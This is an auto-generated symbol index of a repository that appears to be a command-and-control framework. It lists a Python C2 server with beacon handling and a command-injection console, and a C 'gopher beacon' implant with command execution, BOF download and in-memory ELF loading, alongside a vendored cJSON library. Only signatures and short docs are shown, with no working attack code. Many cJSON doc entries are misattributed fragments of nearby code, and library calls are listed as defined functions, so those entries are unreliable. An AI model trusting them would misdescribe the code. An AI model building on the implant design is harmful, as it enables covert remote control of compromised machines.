- Doc: Compute HMAC-SHA256 for message authentication.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### verify_hmac (function) `def verify_hmac(key, data, signature)`
- Defined: `c2/server.py:91`
- Doc: Verify HMAC-SHA256 signature.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### encrypt_data (function) `def encrypt_data(data, key, use_hmac)`
- Defined: `c2/server.py:97`
- Doc: Encrypt data with AES-256-CFB and optional HMAC.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### decrypt_data (function) `def decrypt_data(b64_data, key, use_hmac)`
- Defined: `c2/server.py:117`
- Doc: Decrypt AES-256-CFB data with optional HMAC verification.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### handle_get_command (method) `def handle_get_command(state, selector)`
- Defined: `c2/server.py:150`
- Doc: Dispatch beacon's polling GET request.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### handle_report (method) `def handle_report(state, b64_payload)`
- Defined: `c2/server.py:173`
- Doc: Process beacon result report.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### handle_bof (method) `def handle_bof(state, name)`
- Defined: `c2/server.py:229`
- Doc: Serve BOF file from upload directory.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### handle_request (method) `def handle_request(state, selector)`
- Defined: `c2/server.py:239`
- Doc: Route request to appropriate handler.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### serve_client (method) `def serve_client(state, conn, addr)`
- Defined: `c2/server.py:272`
- Doc: Handle individual client connection.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### command_injector (method) `def command_injector(state)`
- Defined: `c2/server.py:294`
- Doc: Interactive command injection REPL.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### main (method) `def main()`
- Defined: `c2/server.py:317`
- Doc: Start C2 server.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### __init__ (method) `def __init__(self, cfg)`
- Defined: `c2/server.py:139`
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

## cJSON.c

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- Defined: `cJSON.c:94`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- Defined: `cJSON.c:99`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- Defined: `cJSON.c:109`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char*) cJSON_Version(void)`
- Defined: `cJSON.c:124`
- Doc: CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; 
- Depends on: `cJSON.h`

### case_insensitive_strcmp (function) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)`
- Defined: `cJSON.c:134`
- Doc: /* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1)
- Depends on: `cJSON.h`

### internal_malloc (function) `static void * CJSON_CDECL internal_malloc(size_t size)`
- Defined: `cJSON.c:166`
- Doc: } return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t s
- Depends on: `cJSON.h`

### internal_free (function) `static void CJSON_CDECL internal_free(void *pointer)`
- Defined: `cJSON.c:170`
- Depends on: `cJSON.h`

### internal_realloc (function) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- Defined: `cJSON.c:174`
- Depends on: `cJSON.h`

### cJSON_strdup (function) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- Defined: `cJSON.c:188`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- Defined: `cJSON.c:209`
- Depends on: `cJSON.h`

### cJSON_New_Item (function) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)`
- Defined: `cJSON.c:242`
- Doc: if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc ar
- Depends on: `cJSON.h`

### get_decimal_point (function) `static unsigned char get_decimal_point(void)`
- Defined: `cJSON.c:281`
- Doc: item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate
- Depends on: `cJSON.h`

### parse_number (function) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:309`
- Doc: size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks
- Depends on: `cJSON.h`

### ensure (function) `static unsigned char* ensure(printbuffer * const p, size_t needed)`
- Defined: `cJSON.c:494`
- Doc: } typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for form
- Depends on: `cJSON.h`

### update_offset (function) `static void update_offset(printbuffer * const buffer)`
- Defined: `cJSON.c:579`
- Doc: p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->lengt
- Depends on: `cJSON.h`

### compare_double (function) `static cJSON_bool compare_double(double a, double b)`
- Defined: `cJSON.c:592`
- Doc: /* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer *
- Depends on: `cJSON.h`

### print_number (function) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:599`
- Doc: } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely
- Depends on: `cJSON.h`

### parse_hex4 (function) `static unsigned parse_hex4(const unsigned char * const input)`
- Defined: `cJSON.c:669`
- Doc: output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->of
- Depends on: `cJSON.h`

### utf16_literal_to_utf8 (function) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...`
- Defined: `cJSON.c:706`
- Doc: converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX
- Depends on: `cJSON.h`

### parse_string (function) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:827`
- Doc: else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length
- Depends on: `cJSON.h`

### print_string_ptr (function) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...`
- Defined: `cJSON.c:957`
- Doc: { input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(
- Depends on: `cJSON.h`

### print_string (function) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)`
- Defined: `cJSON.c:1079`
- Doc: /* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; b
- Depends on: `cJSON.h`

### buffer_skip_whitespace (function) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)`
- Defined: `cJSON.c:1093`
- Doc: static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char
- Depends on: `cJSON.h`

### skip_utf8_bom (function) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)`
- Defined: `cJSON.c:1119`
- Doc: while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset =
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- Defined: `cJSON.c:1133`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- Defined: `cJSON.c:1235`
- Depends on: `cJSON.h`

### print (function) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...`
- Defined: `cJSON.c:1242`
- Doc: define cjson_min(a, b) (((a) < (b)) ? (a) : (b))
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- Defined: `cJSON.c:1315`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- Defined: `cJSON.c:1320`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- Defined: `cJSON.c:1351`
- Depends on: `cJSON.h`

### parse_value (function) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1372`
- Doc: return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format =
- Depends on: `cJSON.h`

### print_value (function) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1427`
- Doc: if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input
- Depends on: `cJSON.h`

### parse_array (function) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1501`
- Doc: return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: 
- Depends on: `cJSON.h`

### print_array (function) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1599`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array 
- Depends on: `cJSON.h`

### parse_object (function) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1661`
- Doc: output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_
- Depends on: `cJSON.h`

### print_object (function) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1780`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object
- Depends on: `cJSON.h`

### get_array_item (function) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- Defined: `cJSON.c:1915`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- Defined: `cJSON.c:1934`
- Depends on: `cJSON.h`

### get_object_item (function) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- Defined: `cJSON.c:1944`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- Defined: `cJSON.c:1976`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- Defined: `cJSON.c:1981`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- Defined: `cJSON.c:1986`
- Depends on: `cJSON.h`

### suffix_object (function) `static void suffix_object(cJSON *prev, cJSON *item)`
- Defined: `cJSON.c:1993`
- Doc: return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * co
- Depends on: `cJSON.h`

### create_reference (function) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)`
- Defined: `cJSON.c:2000`
- Doc: CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(objec
- Depends on: `cJSON.h`

### add_item_to_array (function) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2020`
- Depends on: `cJSON.h`

### cast_away_const (function) `static void* cast_away_const(const void* string)`
- Defined: `cJSON.c:2066`
- Doc: /* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_
- Depends on: `cJSON.h`

### add_item_to_object (function) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...`
- Defined: `cJSON.c:2073`
- Doc: if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma G
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- Defined: `cJSON.c:2111`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2122`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- Defined: `cJSON.c:2132`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2142`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2154`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2166`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- Defined: `cJSON.c:2178`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2190`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2202`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- Defined: `cJSON.c:2214`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2226`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2238`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- Defined: `cJSON.c:2250`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2286`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2296`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2301`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2308`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2315`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2320`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- Defined: `cJSON.c:2362`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- Defined: `cJSON.c:2412`
- Depends on: `cJSON.h`

### replace_item_in_object (function) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- Defined: `cJSON.c:2422`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- Defined: `cJSON.c:2445`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- Defined: `cJSON.c:2450`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- Defined: `cJSON.c:2467`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- Defined: `cJSON.c:2478`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- Defined: `cJSON.c:2489`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- Defined: `cJSON.c:2500`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- Defined: `cJSON.c:2525`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- Defined: `cJSON.c:2542`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- Defined: `cJSON.c:2554`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- Defined: `cJSON.c:2566`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- Defined: `cJSON.c:2578`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- Defined: `cJSON.c:2595`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- Defined: `cJSON.c:2606`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- Defined: `cJSON.c:2658`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- Defined: `cJSON.c:2698`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- Defined: `cJSON.c:2738`
- Depends on: `cJSON.h`

### cJSON_Duplicate_rec (function) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- Defined: `cJSON.c:2785`
- Depends on: `cJSON.h`

### skip_oneline_comment (function) `static void skip_oneline_comment(char **input)`
- Defined: `cJSON.c:2872`
- Depends on: `cJSON.h`

### skip_multiline_comment (function) `static void skip_multiline_comment(char **input)`
- Defined: `cJSON.c:2885`
- Depends on: `cJSON.h`

### minify_string (function) `static void minify_string(char **input, char **output)`
- Defined: `cJSON.c:2899`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- Defined: `cJSON.c:2921`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- Defined: `cJSON.c:2971`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- Defined: `cJSON.c:2981`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- Defined: `cJSON.c:2991`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- Defined: `cJSON.c:3001`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- Defined: `cJSON.c:3011`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- Defined: `cJSON.c:3021`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- Defined: `cJSON.c:3031`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- Defined: `cJSON.c:3041`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- Defined: `cJSON.c:3051`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- Defined: `cJSON.c:3061`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- Defined: `cJSON.c:3071`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(a_element, a)`
- Defined: `cJSON.c:3157`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(b_element, b)`
- Defined: `cJSON.c:3173`
- Doc: doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is ju
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- Defined: `cJSON.c:3193`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- Defined: `cJSON.c:3198`
- Depends on: `cJSON.h`

### sprintf (function) `sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);`
- Defined: `cJSON.c:128`
- Depends on: `cJSON.h`

### tolower (function) `return tolower(*string1) - tolower(*string2);`
- Defined: `cJSON.c:153`
- Depends on: `cJSON.h`

### void (function) `void (CJSON_CDECL *deallocate)(void *pointer);`
- Defined: `cJSON.c:160`
- Depends on: `cJSON.h`

### malloc (function) `return malloc(size);`
- Defined: `cJSON.c:168`
- Depends on: `cJSON.h`

### free (function) `free(pointer);`
- Defined: `cJSON.c:172`
- Depends on: `cJSON.h`

### realloc (function) `return realloc(pointer, size);`
- Defined: `cJSON.c:176`
- Depends on: `cJSON.h`

### memcpy (function) `memcpy(copy, string, length);`
- Defined: `cJSON.c:205`
- Depends on: `cJSON.h`

### memset (function) `memset(node, '\0', sizeof(cJSON));`
- Defined: `cJSON.c:247`
- Depends on: `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(item->child);`
- Defined: `cJSON.c:262`
- Depends on: `cJSON.h`

### strcpy (function) `strcpy(object->valuestring, valuestring);`
- Defined: `cJSON.c:464`
- Depends on: `cJSON.h`

### cJSON_free (function) `cJSON_free(object->valuestring);`
- Defined: `cJSON.c:475`
- Depends on: `cJSON.h`

### cJSON_ParseWithLengthOpts (function) `return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);`
- Defined: `cJSON.c:1145`
- Depends on: `cJSON.h`

### cJSON_ParseWithOpts (function) `return cJSON_ParseWithOpts(value, 0, 0);`
- Defined: `cJSON.c:1233`
- Depends on: `cJSON.h`

### cJSON_DetachItemViaPointer (function) `return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));`
- Defined: `cJSON.c:2293`
- Depends on: `cJSON.h`

### cJSON_ReplaceItemViaPointer (function) `return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);`
- Defined: `cJSON.c:2419`
- Depends on: `cJSON.h`

## cJSON.h

### void (function) `void (CJSON_CDECL *free_fn)(void *ptr);`
- Defined: `cJSON.h:118`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `cJSON.c`, `gopher_beacon.c`

### sensitive (function) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`
- Defined: `cJSON.h:249`
- Imported by: `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `cJSON.c`, `gopher_beacon.c`

## gopher_beacon.c

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `gopher_beacon.c:137`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `gopher_beacon.c:190`
- Doc: === BEACON API ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `gopher_beacon.c:202`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `gopher_beacon.c:214`
- Doc: === CRATE TRAPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `gopher_beacon.c:250`
- Doc: === CLEAN TRAMPOLINE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `gopher_beacon.c:265`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `gopher_beacon.c:297`
- Doc: === CURL WRITE CALLBACK ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gopher_request (function) `char* gopher_request(const char* host, int port, const char* selector, const char* method, const ...`
- Defined: `gopher_beacon.c:314`
- Doc: === GOPHER REQUEST () ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `gopher_beacon.c:377`
- Doc: === BASE64 ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `gopher_beacon.c:393`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `gopher_beacon.c:417`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `gopher_beacon.c:444`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `gopher_beacon.c:475`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `gopher_beacon.c:506`
- Doc: === Función auxiliar: alinear al tamaño de página ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- Defined: `gopher_beacon.c:511`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `gopher_beacon.c:893`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### download_bof (function) `unsigned char* download_bof(const char* bof_selector, size_t* out_size)`
- Defined: `gopher_beacon.c:922`
- Doc: === DOWNLOAD BOF ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `gopher_beacon.c:950`
- Doc: === RUN BOF AND CAPTURE ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `gopher_beacon.c:994`
- Doc: === MAIN ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

